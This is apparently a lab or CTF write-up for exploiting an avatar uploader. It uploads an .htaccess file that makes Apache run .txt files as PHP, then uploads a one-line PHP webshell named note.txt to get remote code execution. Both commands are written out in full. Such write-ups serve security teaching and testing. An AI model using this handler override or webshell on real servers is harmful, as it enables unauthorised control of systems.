# Task 16 - .htaccess Handler Hijacking

**Vulnerability:** Unrestricted File Upload (CWE-434)
**Endpoint:** `POST /home/upload/avatar`

The avatar uploader's blacklist only checks for executable extensions like `.php`
but does not block `.htaccess` or `.txt`. When Apache has `AllowOverride` enabled
on the uploads directory, an uploaded `.htaccess` file applies to that entire
directory. This lets an attacker redefine which extensions Apache executes as PHP,
then upload a shell disguised as any allowed extension.

---

## Steps

Create a one-line `.htaccess` that tells Apache to treat `.txt` files as PHP:

```bash
echo 'AddHandler application/x-httpd-php .txt' > .htaccess
```

Upload it via the photo uploader:

<img width="748" height="622" alt="image" src="https://github.com/user-attachments/assets/aed7c5fe-96d8-4515-acc5-be39a97d2ab8" />

Create a webshell saved as `note.txt`:

```bash
echo '<?php echo shell_exec($_GET["cmd"]); ?>' > note.txt
```

Upload it via the same photo uploader:

<img width="756" height="625" alt="image" src="https://github.com/user-attachments/assets/295c58ee-6483-4115-8af3-510dce422916" />

## Evidence

Apache now treats `.txt` as PHP for the entire `/uploads/` directory. Navigating
to the shell confirms remote code execution:

<img width="692" height="117" alt="image" src="https://github.com/user-attachments/assets/70dbde70-faee-4951-918f-9db088f7ea94" />

## What this reveals to an attacker

The attacker controls the server's execution rules for an entire directory by
uploading a config file. The shell extension in this case is irrelevant as any file type the
uploader accepts can carry PHP code once `.htaccess` redefines the handler.

## Remediation

See [remediation](../remediation.md)
